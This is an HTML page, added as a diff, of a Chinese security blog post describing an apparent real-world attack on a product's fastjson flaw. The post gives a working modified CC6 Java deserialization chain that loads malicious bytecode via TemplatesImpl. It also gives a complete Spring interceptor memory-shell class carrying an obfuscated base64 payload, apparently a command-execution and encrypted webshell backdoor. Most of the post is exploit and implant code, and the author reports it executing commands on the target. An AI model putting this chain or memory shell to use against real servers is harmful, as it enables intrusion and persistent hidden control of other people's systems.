@@ -1,0 +1,352 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>实战-CC6改造加载恶意字节码注入内存马 | 秋嘞个秋</title>
+<link rel="shortcut icon" href="https://sl3epf.github.io/favicon.ico?v=1710164223744">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://sl3epf.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="实战-CC6改造加载恶意字节码注入内存马 | 秋嘞个秋 - Atom Feed" href="https://sl3epf.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+前言
+赶了一天车，头晕晕😵‍💫
+接着昨天没分析完的点继续搞
+利用分析
+目标是某云匣子的fastjson漏洞，关于漏洞具体分析看我jack👴
+https://zjackky.github.io/post/java-securityc3..." />
+    <meta name="keywords" content="Java" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://sl3epf.github.io">
+  <img class="avatar" src="https://sl3epf.github.io/images/avatar.png?v=1710164223744" alt="">
+  </a>
+  <h1 class="site-title">
+    秋嘞个秋
+  </h1>
+  <p class="site-description">
+    弃我去者，昨日之日不可留
+<br/>
+乱我心者，今日之日多烦忧
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              实战-CC6改造加载恶意字节码注入内存马
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-01-12
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+                <a href="https://sl3epf.github.io/tag/_UMJ5ACaV/" class="post-tag">
+                  # Java
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <!-- more -->
+<h1 id="前言">前言</h1>
+<p>赶了一天车，头晕晕😵‍💫<br>
+接着昨天没分析完的点继续搞</p>
+<h1 id="利用分析">利用分析</h1>
+<p>目标是某云匣子的fastjson漏洞，关于漏洞具体分析看我jack👴<br>
+<strong>https://zjackky.github.io/post/java-securityc3p0-chain-original-analysis-duplicated-20240113-17-05-58-cgbxn.html</strong></p>
+<h2 id="问题">问题</h2>
+<p>开始是简单的想到利用CC3加载恶意类，但是后面尝试发现是不行的。因为我们在CC链的时候了解过，<br>
+在jdk8u71之后，代理类<code>AnnotationInvocationHandler</code>中的<code>this.memberValues</code>被替换为了<code>linkedhashmap</code>，所以会报错没有<code>entrySet</code>键。</p>
+<h2 id="解决">解决</h2>
+<p>因为CC6是不受版本限制的，我们可以利用<code>TemplatesImpl</code>改造它<br>
+参考这个师傅 https://f4de-bak.github.io/pages/ca9de1/#%E6%94%B9%E9%80%A0cc6<br>
+具体代码为</p>
+<pre><code class="language-java">package Qiu;
+
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.*;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC6V2 {
+    public static void main(String[] args) throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        pool.appendClassPath(&quot;xxx/java/Qiu/&quot;);
+        CtClass ctClass = pool.get(&quot;EvilTest&quot;);
+        byte[] payloads = ctClass.toBytecode();
+//        byte[] payloads = Base64.getDecoder().decode();
+
+        TemplatesImpl templates = new TemplatesImpl();
+        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] {payloads});
+        setFieldValue(templates, &quot;_name&quot;, &quot;qiuqiu&quot;);
+        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+        Transformer transformer = new InvokerTransformer(&quot;getClass&quot;, null, null);
+
+        Map innerMap = new HashMap();
+        Map outerMap = LazyMap.decorate(innerMap, transformer);
+
+        TiedMapEntry tme = new TiedMapEntry(outerMap, templates);
+
+        Map expMap = new HashMap();
+        expMap.put(tme, &quot;qiu&quot;);
+
+        outerMap.clear();
+
+        setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);
+//
+//        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+//        oos.writeObject(expMap);
+//        oos.close();
+
+        unserialize(&quot;ser.bin&quot;);
+
+    }
+
+
+    public static void setFieldValue(Object obj, String fieldName, Object
+            value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+    public static Object unserialize(String file) throws IOException, ClassNotFoundException {
+//        byte[] decode = Base64.getDecoder().decode(payload);
+//        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream();
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(file));
+        Object obj = ois.readObject();
+        return obj;
+    }
+}
+</code></pre>
+<p>本地搭建相关环境，在jdk8u391的环境下成功执行命令。<br>
+<img src="https://sl3epf.github.io/post-images/1705155062964.jpg" alt="" loading="lazy"><br>
+但是tmd打回显的🐎子又不行，调试了半天还是不行💢。<br>
+刚好外卖到了，边吃鸭脖边又看了两眼，发现🐎子忘记继承<code>AbstractTranslet</code>了...</p>
+<h2 id="内存马">内存马</h2>
+<p>能回显了，但是在实际攻防当中我们最好还是能够打入内存马方便操作。<br>
+考虑到目标环境是spring，我直接就找了以前的springInterceptor的内存马，</p>
+<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.springframework.beans.BeansException;
+import org.springframework.web.context.WebApplicationContext;
+import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.context.request.ServletRequestAttributes;
+
+import javax.servlet.ServletRequest;
+import javax.servlet.http.HttpServletRequest;
+import java.lang.reflect.Method;
+
+public class SpringInterceptorMemShell extends AbstractTranslet {
+    static String b64 = &quot;yv66vgAAADQBSAoAZQCFCACGCQBkAIcIAIgJAGQAiQgAigkAZACLCgBkAIwJAI0AjggAjwoAkACRCACSCwCTAJQIAJUKABMAlgoAEwCXCQCYAJkIAJoHAJsIAJwIAJ0IAJ4IAJ8HAKAKAKEAogoAoQCjCgCkAKUKABgApggApwoAGACoCgAYAKkLAKoAqwoArACRCwCTAK0LAJMArggArwgAsAsAkwCxBwCyCgAnAIUIALMKACcAtAgAtQgAtggAtwsAuAC5CAC6CgC7ALwHAL0HAL4KADIAhQsAuAC/CgAyAMAIAMEKADIAwgoAMgDDCgATAMQKADEAxQoAuwDGBwDHCgA8AIULAJMAyAoAyQDKCgA8AMsKALsAzAgAzQoARQDOCADPBwDQBwDRCQDSANMKAEUA1AoA1QDWCgBMANcKAEUA2AcA2QoA0gDaCgDVANsKAEUA3AoATACWCADdBwDeCgBSAN8KAOAA4QoA4ADiCADjCgBbAOQJAGQA5QcA5ggA5wcA6AcA6QoAXADfBwDqCgBeAN8HAOsKAGAA3wcA7AoAYgDfBwDtBwDuAQASbXlDbGFzc0xvYWRlckNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsBABBiYXNpY0NtZFNoZWxsUHdkAQASTGphdmEvbGFuZy9TdHJpbmc7AQATYmVoaW5kZXJTaGVsbEhlYWRlcgEAEGJlaGluZGVyU2hlbGxQd2QBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAJcHJlSGFuZGxlAQBkKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDspWgEADVN0YWNrTWFwVGFibGUHAJsHAO8HAPAHAN4BAApFeGNlcHRpb25zAQAKaW5pdGlhbGl6ZQcA7QcA6AcA5gcA8QcA6QcA6gcA6wcA7AEAClNvdXJjZUZpbGUBAB9EeW5hbWljSW50ZXJjZXB0b3JUZW1wbGF0ZS5qYXZhAQAZUnVudGltZVZpc2libGVBbm5vdGF0aW9ucwEAK0xvcmcvc3ByaW5nZnJhbWV3b3JrL3N0ZXJlb3R5cGUvQ29udHJvbGxlcjsMAGwAbQEABHBhc3MMAGgAaQEADFgtT3B0aW9ucy1BaQwAagBpAQAQZTQ1ZTMyOWZlYjVkOTI1YgwAawBpDAB4AG0HAPIMAPMA9AEAIlsrXSBEeW5hbWljIEludGVyY2VwdG9yIHNheXMgaGVsbG8HAPUMAPYA9wEABHR5cGUHAPgMAPkA+gEABWJhc2ljDAD7APwMAP0A/gcA/wwBAABpAQABLwEAEGphdmEvbGFuZy9TdHJpbmcBAAcvYmluL3NoAQACLWMBAANjbWQBAAIvQwEAEWphdmEvdXRpbC9TY2FubmVyBwEBDAECAQMMAQQBBQcBBgwBBwEIDABsAQkBAAJcQQwBCgELDAEMAQ0HAQ4MAQ8BEAcBEQwBEgD6DAETAQ0BAARQT1NUAQAGUWl1UUl1DAEUARUBABFqYXZhL3V0aWwvSGFzaE1hcAEAB3JlcXVlc3QMARYBFwEACHJlc3BvbnNlAQAHc2Vzc2lvbgEAAXUHARgMARkBGgEAA0FFUwcA7wwBGwEcAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAEdAR4MAR8BIAEAAAwBHwEhDAEiAQ0MASMBJAwAbAElDAEmAScBABZzdW4vbWlzYy9CQVNFNjREZWNvZGVyDAEoASkHASoMASsBDQwBLAEtDAEuAS8BABVqYXZhLmxhbmcuQ2xhc3NMb2FkZXIMATABMQEAC2RlZmluZUNsYXNzAQAPamF2YS9sYW5nL0NsYXNzAQACW0IHATIMATMAZwwBNAE1BwDxDAE2ATcMATgBOQwBOgE7AQAQamF2YS9sYW5nL09iamVjdAwBPAE9DAE+AT8MAUABQQEAB1FpdVlZRFMBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAFCAG0HAUMMAUQBRQwBRgE7AQAnY29tLmZlaWhvbmcubGRhcC50ZW1wbGF0ZS5NeUNsYXNzTG9hZGVyDAFHATEMAGYAZwEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uAQMceXY2NnZnQUFBRElBR3dvQUJRQVdCd0FYQ2dBQ0FCWUtBQUlBR0FjQUdRRUFCanhwYm1sMFBnRUFHaWhNYW1GMllTOXNZVzVuTDBOc1lYTnpURzloWkdWeU95bFdBUUFFUTI5a1pRRUFEMHhwYm1WT2RXMWlaWEpVWVdKc1pRRUFFa3h2WTJGc1ZtRnlhV0ZpYkdWVVlXSnNaUUVBQkhSb2FYTUJBQ2xNWTI5dEwyWmxhV2h2Ym1jdmJHUmhjQzkwWlcxd2JHRjBaUzlOZVVOc1lYTnpURzloWkdWeU93RUFBV01CQUJkTWFtRjJZUzlzWVc1bkwwTnNZWE56VEc5aFpHVnlPd0VBQzJSbFptbHVaVU5zWVhOekFRQXNLRnRDVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjMHh2WVdSbGNqc3BUR3BoZG1FdmJHRnVaeTlEYkdGemN6c0JBQVZpZVhSbGN3RUFBbHRDQVFBTFkyeGhjM05NYjJGa1pYSUJBQXBUYjNWeVkyVkdhV3hsQVFBU1RYbERiR0Z6YzB4dllXUmxjaTVxWVhaaERBQUdBQWNCQUNkamIyMHZabVZwYUc5dVp5OXNaR0Z3TDNSbGJYQnNZWFJsTDAxNVEyeGhjM05NYjJGa1pYSU1BQThBR2dFQUZXcGhkbUV2YkdGdVp5OURiR0Z6YzB4dllXUmxjZ0VBRnloYlFrbEpLVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBQ0VBQWdBRkFBQUFBQUFDQUFBQUJnQUhBQUVBQ0FBQUFEb0FBZ0FDQUFBQUJpb3J0d0FCc1FBQUFBSUFDUUFBQUFZQUFRQUFBQVFBQ2dBQUFCWUFBZ0FBQUFZQUN3QU1BQUFBQUFBR0FBMEFEZ0FCQUFrQUR3QVFBQUVBQ0FBQUFFUUFCQUFDQUFBQUVMc0FBbGtydHdBREtnTXF2cllBQkxBQUFBQUNBQWtBQUFBR0FBRUFBQUFJQUFvQUFBQVdBQUlBQUFBUUFCRUFFZ0FBQUFBQUVBQVRBQTRBQVFBQkFCUUFBQUFDQUJVPQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24BACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BACtqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uVGFyZ2V0RXhjZXB0aW9uAQAaRHluYW1pY0ludGVyY2VwdG9yVGVtcGxhdGUBAEFvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvSGFuZGxlckludGVyY2VwdG9yQWRhcHRlcgEAE2phdmF4L2NyeXB0by9DaXBoZXIBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAHaXNFbXB0eQEAAygpWgEADGphdmEvaW8vRmlsZQEACXNlcGFyYXRvcgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAlnZXRIZWFkZXIBAAlnZXRNZXRob2QBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAMc2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEADGdldEF0dHJpYnV0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEACWdldFJlYWRlcgEAGigpTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEACHJlYWRMaW5lAQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RvRmluYWwBAAYoW0IpW0IBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAEWphdmEvbGFuZy9JbnRlZ2VyAQAEVFlQRQEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAPcHJpbnRTdGFja1RyYWNlAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEACWxvYWRDbGFzcwAhAGQAZQAAAAQAAgBmAGcAAAACAGgAaQAAAAIAagBpAAAAAgBrAGkAAAADAAEAbABtAAEAbgAAAEcAAgABAAAAGyq3AAEqEgK1AAMqEgS1AAUqEga1AAcqtwAIsQAAAAEAbwAAABoABgAAABgABAAUAAoAFQAQABYAFgAZABoAGgABAHAAcQACAG4AAAKHAAcACwAAAcGyAAkSCrYACysSDLkADQIAxgCQKxIMuQANAgASDrYAD5kAgCsqtAADuQANAgA6BBkExgGOGQS2ABCaAYYBOgWyABESErYAD5kAGwa9ABNZAxIUU1kEEhVTWQUZBFM6BqcAGAa9ABNZAxIWU1kEEhdTWQUZBFM6BrsAGFm4ABkZBrYAGrYAG7cAHBIdtgAetgAfOgcsuQAgAQAZB7YAIQOsKyq0AAW5ACICAMYBFSu5ACMBABIktgAPmQD9sgAJEiW2AAsruQAmAQA6BrsAJ1m3ACg6BxkHEikrtgAqVxkHEisstgAqVxkHEiwZBrYAKlcqtAAHOgQZBhItGQS5AC4DABIvuAAwOgUZBQW7ADFZuwAyWbcAMxkGEi25ADQCALYANRI2tgA3tgA4tgA5Ei+3ADq2ADsZBbsAPFm3AD0ruQA+AQC2AD+2AEC2AEE6CBJCuABDEkQGvQBFWQMSRlNZBLIAR1NZBbIAR1O2AEg6CRkJBLYASRkJKrYASrYASwa9AExZAxkIU1kEA7gATVNZBRkIvrgATVO2AE7AAEU6ChkKtgBPGQe2AFBXsgAJElG2AAsDrKcACjoGGQa2AFMErAABAK0BtAG4AFIAAgBvAAAAigAiAAAAHQAIACAAIwAhAC8AIgA8ACMAPwAlAEoAJgBiACgAdwArAJMALACeAC0AoAAvAK0AMQC7ADIAwwAzAMsANADUADUA3QA2AOYANwDwADgA9gA5AQEAOgEIADsBNQA8AU8APQFwAD4BdgA/AaAAQAGrAEEBswBCAbUARgG4AEQBugBFAb8ASQByAAAAHAAG/QBiBwBzBwB0/AAUBwB1+AAo+wEUQgcAdgYAdwAAAAQAAQBSAAIAeABtAAEAbgAAAXgABwAHAAAAlbgAVLYAVUwqKxJWtgBXtQBYpwBrTRJaTrsAPFm3AD0ttgBAOgQBOgUSWxJEBr0ARVkDEkZTWQSyAEdTWQWyAEdTtgBIOgUZBQS2AEkqGQUrBr0ATFkDGQRTWQQDuABNU1kFGQS+uABNU7YATsAARbUAWKcACjoGGQa2AF2nABhMK7YAX6cAEEwrtgBhpwAITCu2AGOxAAUABwARABQAWQAoAHIAdQBcAAAAfAB/AF4AAAB8AIcAYAAAAHwAjwBiAAIAbwAAAF4AFwAAAE4ABwBRABEAXgAUAFIAFQBTABgAVAAlAFUAKABYAEYAWQBMAFoAcgBdAHUAWwB3AFwAfABlAH8AXwCAAGAAhABlAIcAYQCIAGIAjABlAI8AYwCQAGQAlABnAHIAAABFAAf/ABQAAgcAeQcAegABBwB7/wBgAAYHAHkHAHoHAHsHAHMHAEYHAHwAAQcAff8ABgABBwB5AABCBwB+RwcAf0cHAIAEAAIAgQAAAAIAggCDAAAABgABAIQAAA==&quot;;
+    static String clazzName = &quot;DynamicInterceptorTemplate&quot;;
+
+    static {
+        try {
+            Class&lt;?&gt; RequestContextUtils = Class.forName(&quot;org.springframework.web.servlet.support.RequestContextUtils&quot;);
+
+            Method getWebApplicationContext;
+            try {
+                getWebApplicationContext = RequestContextUtils.getDeclaredMethod(&quot;getWebApplicationContext&quot;, ServletRequest.class);
+            } catch (NoSuchMethodException e) {
+                getWebApplicationContext = RequestContextUtils.getDeclaredMethod(&quot;findWebApplicationContext&quot;, HttpServletRequest.class);
+            }
+            getWebApplicationContext.setAccessible(true);
+
+            WebApplicationContext context = (WebApplicationContext) getWebApplicationContext.invoke(null, ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());
+
+            //从requestMappingHandlerMapping中获取adaptedInterceptors属性 老版本是DefaultAnnotationHandlerMapping
+            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping;
+            try {
+                Class&lt;?&gt; RequestMappingHandlerMapping = Class.forName(&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;);
+                abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(RequestMappingHandlerMapping);
+            } catch (BeansException e) {
+                Class&lt;?&gt; DefaultAnnotationHandlerMapping = Class.forName(&quot;org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping&quot;);
+                abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(DefaultAnnotationHandlerMapping);
+            }
+
+            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);
+            field.setAccessible(true);
+            java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;) field.get(abstractHandlerMapping);
+
+            //加载ysoserial.payloads.templates.SpringInterceptorTemplate类的字节码
+            byte[] bytes = sun.misc.BASE64Decoder.class.newInstance().decodeBuffer(b64);
+            java.lang.ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+            java.lang.reflect.Method m0 = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);
+            m0.setAccessible(true);
+            m0.invoke(classLoader, clazzName, bytes, 0, bytes.length);
+            //添加SpringInterceptorTemplate类到adaptedInterceptors
+            adaptedInterceptors.add(classLoader.loadClass(clazzName).newInstance());
+        } catch (Exception e) {
+//            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+</code></pre>
+<p>成功执行<br>
+<img src="https://sl3epf.github.io/post-images/1705156354824.png" alt="" loading="lazy"><br>
+但是貌似路径只能限制在<code>/3.0/authService/config</code>这里。<br>
+测试tomcat的listener类型内存马也可以。<br>
+<img src="https://sl3epf.github.io/post-images/1705156537262.png" alt="" loading="lazy"></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90">利用分析</a>
+<ul>
+<li><a href="#%E9%97%AE%E9%A2%98">问题</a></li>
+<li><a href="#%E8%A7%A3%E5%86%B3">解决</a></li>
+<li><a href="#%E5%86%85%E5%AD%98%E9%A9%AC">内存马</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://sl3epf.github.io/post/CGspU2zIY/">
+              <h3 class="post-title">
+                代码审计-某云盘系统GetShell
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Friends: <a href="https://zjackky.github.io/" target="_blank">zjackky</a>&nbsp;<a href="https://jaspersec.top/" target="_blank">jasper</a>&nbsp;<a href="https://zikh26.github.io/" target="_blank">zikh26</a>&nbsp;<a href="http://payioad.com/" target="_blank">payioad</a>&nbsp;
+<a href="http://blog.ldsecurity.cn/" target="_blank">凌度</a>&nbsp;<a href="http://www.aiwin.fun/" target="_blank">aiwin</a>&nbsp;
+  <a class="rss" href="https://sl3epf.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
